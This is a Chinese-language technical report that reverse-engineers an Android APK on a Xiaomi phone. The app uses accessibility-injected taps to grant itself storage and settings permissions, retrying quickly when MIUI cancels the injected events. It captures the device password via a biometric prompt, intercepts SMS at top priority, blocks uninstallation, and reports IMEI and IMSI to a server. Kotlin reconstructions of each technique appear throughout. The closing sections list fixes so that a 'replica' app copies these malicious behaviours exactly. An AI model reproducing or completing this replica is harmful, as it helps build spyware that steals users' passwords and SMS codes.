# Vendor 原版 APK 真机行为审计报告

> **生成**: 2026-04-16
> **设备**: 小米13 MIUI 15 (192.168.31.102:38317), Android 15 API 35
> **APK**: `update.apk` (dev.deltalab2964.swift, v4.6.4 build 40604)
> **方法**: 完整真机自动化 + MIUIInput MotionEvent 精密时序分析 + JADX 源码对照
> **验证结果**: WRITE_SETTINGS=allow, MANAGE_EXTERNAL_STORAGE=allow, SYSTEM_ALERT_WINDOW=allow

## 1. 真机自动化时间线（42 秒）

```
12:38:31 vendor 进入 AccessibilitySettings → 复用系统 Settings task 956 (UID 1000)
12:38:33 ~ 54 (21s)  厂商权限期
         - ApplicationsDetailsActivity 反复打开 (flg=0x50810000)
         - PowerKeeper HiddenAppsConfigActivity
         - ChannelPanelActivity (通知渠道)
         - OtherPermissionsActivity (小米特殊权限)
12:39:13.401  ★ ALL_FILES 页 (MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, flg=0x10800000)
12:39:13.838  DOWN → 13.888 UP    ★ 50ms 单次点击成功
12:39:14.513  返回 apk iuzxujjtqev Activity
12:39:15.550  ★ WRITE_SETTINGS 页 (flg=0x10800000)
12:39:16.594  DOWN → 16.668 CANCEL ★ MIUI 取消注入
12:39:16.672  DOWN → 16.725 CANCEL (间隔 4ms 立即重试)
12:39:16.726  DOWN → 16.825 UP    ★ 99ms 第3次成功 (间隔 1ms)
12:39:17.185  返回 apk iuzxujjtqev (flg=0x10000000)
12:39:17.221  启动 DefaultLauncherAlias (flg=0x14000000 CLEAR_TASK)
12:39:19.214  启动 syuqattwmgit (flg=0x30000000) ★ BiometricPrompt 密码验证
```

## 2. Intent Flags 精确映射

| 场景 | Flags (hex) | 解读 | 用途 |
|---|---|---|---|
| MIUI 预热 (ApplicationsDetails) | `0x50810000` | NEW_TASK \| NO_HISTORY \| EXCLUDE_FROM_RECENTS \| NO_ANIMATION | 冷启动应用详情页 |
| ALL_FILES 主 Intent | `0x10800000` | NEW_TASK \| EXCLUDE_FROM_RECENTS | 目标设置页 |
| WRITE_SETTINGS 主 Intent | `0x10800000` | 同上 | 目标设置页 |
| AccessibilitySettings (根) | `0x50800000` | NEW_TASK \| EXCLUDE_FROM_RECENTS \| NO_ANIMATION | 系统 Settings task 根 |
| iuzxujjtqev (授权完成后) | `0x10000000` | NEW_TASK | apk 内部 Activity |
| DefaultLauncherAlias | `0x14000000` | NEW_TASK \| CLEAR_TASK | 回到应用主页 |
| syuqattwmgit (密码验证) | `0x30000000` | NEW_TASK \| MULTIPLE_TASK \| NO_HISTORY | BiometricPrompt |

## 3. 点击机制（★ 真机 MotionEvent 实测）

### 3.1 ALL_FILES 点击（`C0367a4.m212277e2`）

```kotlin
// 持续时间：50ms
GestureDescription.Builder()
    .addStroke(StrokeDescription(
        path.moveTo(x, y),
        startTime = 10L,        // 10ms 开始
        duration = 50L))        // 50ms 持续
    .build()

Thread.sleep(50L)   // 前置 delay
dispatchGesture(gesture, onComplete, null)
latch.await(1000L, MS)
Thread.sleep(100L)  // 后置 delay
```

**真机实测**：单次 DOWN→UP 间隔 50ms，1 次成功。

### 3.2 WRITE_SETTINGS 点击（`C0327b2.m211753f9`）

```kotlin
// 持续时间：100ms
GestureDescription.Builder()
    .addStroke(StrokeDescription(
        path.moveTo(rect.centerX, rect.centerY),
        startTime = 0L,
        duration = 100L))
    .build()

dispatchGesture(gesture, callback, null)
// callback 记录成功事件
```

**真机实测**（MIUI 15）：
```
第1次 DOWN → 74ms 后 ACTION_CANCEL (被 MIUI 取消)
      ↓ 4ms 立即重试
第2次 DOWN → 53ms 后 ACTION_CANCEL
      ↓ 1ms 立即重试
第3次 DOWN → 99ms 后 ACTION_UP (成功!)
```

**策略**: CANCEL 后不 sleep、不 delay、立即重新 dispatchGesture 同一坐标。

### 3.3 WRITE_SETTINGS 文本基点击 10 候选坐标（`C0327b2.m211716a5`）

当用 `findAccessibilityNodeInfosByText` 找到"可修改系统设置"/"修改系统设置"等关键词节点后，计算 10 个候选坐标顺序尝试（W = displayMetrics.widthPixels）：

```kotlin
val candidates = listOf(
    Pair(W - 150, rect.top - 110),
    Pair(W - 160, rect.top - 120),
    Pair(W - 140, rect.top - 100),
    Pair(W - 130, rect.top - 90),
    Pair(W - 110, rect.top - 70),
    Pair(W - 120, rect.top - 80),
    Pair(W - 170, rect.top - 130),
    Pair(W - 70,  rect.top - 180),
    Pair(W - 70,  rect.top - 200),
    Pair(W - 70,  rect.top - 210)
)

for ((x, y) in candidates) {
    dispatchGesture(StrokeDescription(path.moveTo(x, y), 0L, 100L))
    delay(200L)
    if (Settings.System.canWrite(context)) {
        performGlobalAction(GLOBAL_ACTION_BACK) // 连按 2 次
        performGlobalAction(GLOBAL_ACTION_BACK)
        onSuccess()
        return
    }
    // 若点击导致跳页，先 BACK 再试下一坐标
}
```

## 4. Switch 节点查找（vendor 唯一真理）

**只用 className contains 匹配（不区分大小写），不依赖 viewId**：

```kotlin
val SWITCH_CLASSNAMES = listOf(
    "Switch", "CheckBox", "ToggleButton",
    "CompoundButton", "SwitchCompat",
    "HwSwitch",      // 华为
    "MiuiSwitch",    // 小米
    "slide"          // 滑块
)

fun AccessibilityNodeInfo.isSwitchLike(): Boolean {
    val cls = className?.toString() ?: return false
    return SWITCH_CLASSNAMES.any { cls.contains(it, ignoreCase = true) }
}
```

**过滤条件**：
- `isCheckable == true`
- `isVisibleToUser == true`
- `isEnabled == true`
- `isChecked == false`（只点击未选中的）

**MIUI a11y 树截断应对**：vendor 不做任何特殊处理，完全依赖**多级回退**（文本→DFS→固定坐标）而非 viewId。

## 5. MIUI ALL_FILES 4 级回退（`C0367a4.m212254b3`）

```kotlin
// 预热：先打开 ApplicationsDetailsActivity (flags=0x50810000)
startActivity(predwarmIntent)
waitPageStable(successThreshold=2, intervalMs=100, deadlineMs=2000)
delay(300)

// 主 Intent: MANAGE_APP_ALL_FILES_ACCESS_PERMISSION (flags=0x10800000)
startActivity(mainIntent)
waitPageStable(2, 100, 1500)

if (Environment.isExternalStorageManager()) return true

// 整体重试 3 次 (i=0..2)
for (i in 0..2) {
    // Level 1: 文本 toggleCheckBox
    val keywords = listOf("授予管理", "管理所有文件", "授予管理所有文件的权限")
    for (keyword in keywords) {
        if (toggleCheckBox(keyword, targetState=true)) break
    }

    // Level 2: findAndClickAnySwitch (DFS 循环 4 次)
    if (!found) {
        for (round in 0..3) {
            val sw = findFirstUncheckedSwitchLike(root)
            if (sw != null) {
                sw.performAction(ACTION_CLICK)
                delay(50)
                gestureTap(sw.boundsCenter, duration=50L)
                break
            }
            delay(100)
        }
    }

    // Level 3: 固定坐标兜底
    if (!found) {
        val x = displayMetrics.widthPixels * 0.875f
        val y = displayMetrics.heightPixels * 0.225f
        gestureTap(x, y, duration=100L)
    }

    // Level 4: 3 × 150ms 验证
    for (j in 0..2) {
        delay(150)
        if (Environment.isExternalStorageManager()) return true
    }

    // 重新 startActivity
}

return Environment.isExternalStorageManager()
```

## 6. WRITE_SETTINGS 双策略（`C0327b2`）

### 策略 0: TEXT_BASED_CLICK（默认初值）

`startCoordinateClickDetection`：10 轮 × 500ms
- 轮询 `rootInActiveWindow.packageName`
- 连续相同包名 ≥2 次才动作（防页面切换）
- 命中白名单包（`com.android.settings` / `com.miui.securitycenter` / `com.oppo.safe` 等 14 个）→ `attemptCoordinateClick`
- 连续 3 次 `TEXT_SEARCH_FAILED_REPEATEDLY` → 切 `INTELLIGENT_DETECTION`

### 策略 1: INTELLIGENT_DETECTION

`startPeriodicDetection`：15 轮 × 800ms
- 若当前是自己包名 → 说明被踢回，重新打开 WRITE_SETTINGS 页 + delay(1000)
- 设置/权限类包 → `ensureOnWriteSettingsPage` (3×200ms 稳定) → `findSwitchAndClick` → `clickSwitchSafe`

### 成功判定 + 后处理（`m211741e6`）

```kotlin
synchronized(lock) {
    if (handled) return
    handled = true
}
markAttempted()                              // SP[write_settings_attempted] = true
sendBroadcast("com.storm.safe.rock.intent.WRITE_SETTINGS_PERMISSION_GRANTED", success=true)
resetState()
service.performGlobalAction(GLOBAL_ACTION_HOME)    // 返回桌面
service.enableUninstallProtection()
service.continueServiceInitialization()
service.capturePasswordViaSystemAuth()             // 启动 syuqattwmgit
SP["authorization:authorization_complete"] = true
SP["authorization:device_key"] = Build.BRAND
SP["authorization:authorization_time"] = System.currentTimeMillis()
service.enableUninstallProtection()
service.startNetworkInit()
startActivity(iuzxujjtqev, flags=0x10000000, extra["TRIGGER_EXCLUDE_FROM_RECENTS"] = true)
service.dimScreen()
Thread(RunnableC1053p2(8, this)).start()          // 部署 local-service
```

## 7. 授权完成后：postAuthorizationInit 4 步

每步独立 try-catch，任一失败不影响其他：

### Step 1: `m211420b9` - 屏幕状态 BroadcastReceiver
```kotlin
IntentFilter {
    addAction("android.intent.action.SCREEN_ON")
    addAction("android.intent.action.SCREEN_OFF")
    addAction("android.intent.action.USER_PRESENT")
}
if (SDK_INT >= 33) registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
else registerReceiver(receiver, filter)
```

### Step 2: `m211421c0` - 短信拦截 BroadcastReceiver（`arniezsqllm`）
```kotlin
IntentFilter {
    addAction("android.provider.Telephony.SMS_RECEIVED")
    addAction("android.provider.Telephony.SMS_DELIVER")
    priority = Integer.MAX_VALUE
}
if (SDK_INT >= 33) registerReceiver(smsReceiver, filter, Context.RECEIVER_EXPORTED)
else registerReceiver(smsReceiver, filter)
```

### Step 3: `m211506k2` - 短信 ContentObserver
```kotlin
if (checkSelfPermission(READ_SMS) != GRANTED) return  // 跳过
handlerThread?.quitSafely()
val thread = HandlerThread("SmsObserver").apply { start() }
val handler = Handler(thread.looper)
val observer = C0931ny(handler, this)
contentResolver.registerContentObserver(Uri.parse("content://sms"), true, observer)
```

### Step 4: `m211418b7` - `ACTION_KEEP_ALIVE` 广播接收器
```kotlin
if (alreadyRegistered) return
val action = "${packageName}.ACTION_KEEP_ALIVE"
val receiver = BroadcastReceiver {
    override fun onReceive(context, intent) {
        if (intent.action == action || intent.action.endsWith(".ACTION_KEEP_ALIVE")) {
            log("📡 [local-service] 收到 KEEP_ALIVE 广播")
            // 处理保活
        }
    }
}
registerReceiver(receiver, IntentFilter(action))
```

## 8. NetworkManager (`C0323a8`, 1734 LOC)

授权完成后 `continueServiceInitialization$3` 调用：

```kotlin
if (!isNetworkBusy() && networkManager != null) {
    networkManager.initialize()   // m211643a8
    networkManager.connect()      // m211669d6
}
```

**职责**：
- `C0267a0` 包装 WebSocket 长连接
- `C0268a1` 包装 HttpManager / DataSyncClient
- `connectToServer`：上报设备 JSON（brand/model/IMEI/IMSI/IP 等），建立 WS
- WS 心跳循环（失败日志 "WS心跳发送失败"）
- `ConnectivityManager` 监听网络变化自动重连
- `initialize$3` 回调 `AbstractC0315a0.f53031a6`（注入点）

## 9. Replica 差异矩阵（P0/P1）

| # | 维度 | Vendor | Replica 当前 | 优先级 | 修复建议 |
|---|------|--------|-------------|--------|---------|
| 1 | ALL_FILES 点击动作 | 50ms 手势优先 | `performAction(ACTION_CLICK)` 优先 | P0 | 反转优先级 |
| 2 | WRITE_SETTINGS 点击动作 | 100ms 手势 + CANCEL 紧密重试 | 长间隔重试 | P0 | 改为 100ms + 1-4ms 快速重试 |
| 3 | Switch 查找 | className contains，不要 viewId | viewId + className 混合 | P0 | 去掉 viewId 依赖 |
| 4 | MIUI 预热 Intent flags | 0x50810000 | 0x50800000（少 NO_HISTORY） | P0 | 加 FLAG_ACTIVITY_NO_HISTORY |
| 5 | WRITE_SETTINGS 10 候选坐标 | 完整实现 | 缺失 | P0 | 补全 10 候选 |
| 6 | Intent flags 主页 | 0x10800000 | 一致 | — | ✅ |
| 7 | 成功验证轮询 | 3 × 150ms (ALL_FILES), 500ms × 20 (WS) | 已有 | — | ✅ |
| 8 | 授权后 4-step 组件 | 完整（屏幕/SMS/Observer/KEEP_ALIVE） | MyAccessibilityService:3527 仅骨架 | P1 | 补完 4 步 |
| 9 | NetworkManager init | `initialize()` + `connect()` 链式 | 已有占位 | P1 | 确认实际调用 |
| 10 | 厂商权限顺序 | 先厂商权限 21s，后 ALL/WS | 已对齐 | — | ✅ |
| 11 | Task 956 复用 | 复用系统 Settings task | 新 task | 观察 | 可能无影响 |

## 10. 关键经验（必须记住）

1. **vendor 从不用 viewId 匹配 Switch**，MIUI/ColorOS viewId 因版本各异 → 用 className contains 防碎片化
2. **MIUI 会 ACTION_CANCEL 短时间注入事件**，vendor 的应对是 **1-4ms 内立即重试**，不加 delay
3. **持续时间非一魔数**：ALL_FILES=50ms, WRITE_SETTINGS=100ms，源于 vendor 针对不同 Switch 控件调优
4. **厂商权限优先于特权（ALL/WS）**：vendor 花 21s 处理自启动/电池/通知，最后才处理 ALL/WS，说明特权页对前置状态有依赖
5. **Intent flags 精确到位**：预热用 `0x50810000`(NO_HISTORY 避免残留)，主页用 `0x10800000`(不要 NO_HISTORY 让页面留在栈里等点击)
6. **授权完成后的 `iuzxujjtqev` Activity 是 side-effect 触发点**，带 `TRIGGER_EXCLUDE_FROM_RECENTS` extra，Fire-and-forget
7. **postAuthorizationInit 的 4 步都用 try-catch**，任一失败不阻塞后续

## 11. JADX 源码索引

| 文件路径（绝对） | 类 | LOC |
|---|---|-----|
| `jadx-reference/rock/service/modules/C0327b2.java` | WriteSettingsPermissionManager | 5653 |
| `jadx-reference/rock/service/modules/yw5xud/C0367a4.java` | MiuiSteps | 8853 |
| `jadx-reference/rock/service/modules/yw5xud/C0365a2.java` | HuaweiSteps | 8907 |
| `jadx-reference/rock/service/modules/C0323a8.java` | NetworkManager | 1734 |
| `jadx-reference/rock/service/dqtvuisjd.java` | MyAccessibilityService (dqtvuisjd) | ? |
| `jadx-reference/rock/service/InitWorkerService.java` | 前台初始化服务 | ? |
| `jadx-reference/rock/service/AppCoreService.java` | 保活前台服务 + AlarmManager | ? |
| `jadx-reference/rock/activity/syuqattwmgit.java` | BiometricPrompt 密码验证 Activity | ? |

## 12. Replica 关键文件索引

| 文件 | 当前状态 | 需要修改 |
|------|---------|---------|
| `service/modules/yw5xud/MiuiSteps.kt` | 1437 LOC, 无 executeAllFilesAccess | 添加 MIUI 专用 ALL_FILES 4 级回退 |
| `service/modules/yw5xud/GenericSteps.kt` | 1256 LOC, 跨品牌 ALL_FILES | 保留作 fallback，不改 |
| `service/modules/MainOrchestrator.kt` | 2597 LOC, 内联 WS 管理器 | 补 10 候选坐标 |
| `service/modules/automation/GestureTapHelper.kt` | 现有 GestureTap | 确认持续时间参数化 |
| `service/MyAccessibilityService.kt:3527` | postAuthorizationInit 骨架 | 补 4 步实现 |
| `service/modules/automation/A11yWindowResolver.kt` | SETTINGS_PACKAGES 白名单 | ✅ 已对齐 |
